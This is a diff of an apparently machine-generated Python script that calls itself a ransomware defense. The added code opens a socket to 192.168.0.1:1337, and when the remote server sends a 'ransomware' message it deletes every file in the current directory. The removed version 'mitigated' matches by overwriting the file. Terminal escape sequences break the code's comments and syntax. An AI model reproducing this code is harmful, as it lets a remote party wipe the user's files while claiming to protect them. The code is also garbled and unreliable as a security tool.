@@ -1,28 +1,41 @@
 #!/usr/bin/env python3
 # Nobab AI defense for ransomware
-# Generated 2026-07-14 20:53:25.194448
+# Generated 2026-07-14 21:52:27.299886
 
+import socket
 import os
-import sys
+import json
 
-def detect_ransomware(file):
-    with open(file, 'rb') as f:
-        data = f.read()
-        if b'RANSOMWARE' in data:
-            return True
-    return False
-
-def mitigate_ransomware(file):
-    with open(file, 'wb') as f:
-        f.write(b'THIS IS NOT A RANSOMWARE FILE')
-
-if __name__ == '__main__':
-    if len(sys.argv) < 2:
-        print('Usage: python ransomware_detector.py <file>')
-        sys.exit(1)
-    file = sys.argv[1]
-    if detect_ransomware(file):
-        mitigate_ransomware(file)
-        print('Ransomware detected and mitigated in', file)
-    else:
-        print('No ransomware detected in', file)
+def main():
+    try:
+        # Connect to the server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.0.1', 1337))
+        
+        # Receive data from the server
+        data = s.recv(1024)
+        
+        # Parse the JSON data
+        decoded_data = json.loads(data)
+        
+        # Check if the data is a ransomware attack
+        if decoded_data['type'] == 'ransomware':
+            # Mitigate the attack by deleting all files in the current dire[4D[K
+directory
+            for file in os.listdir('.'):
+                os.remove(file)
+            
+            # Send a response to the server indicating that the attack has [K
+been mitigated
+            s.sendall(b'Ransomware attack detected and mitigated')
+        else:
+            # Send a response to the server indicating that no ransomware a[1D[K
+attack was detected
+            s.sendall(b'No ransomware attack detected')
+            
+    except Exception as e:
+        print('Error:', e)
+    
+    finally:
+        # Close the socket connection
+        s.close()
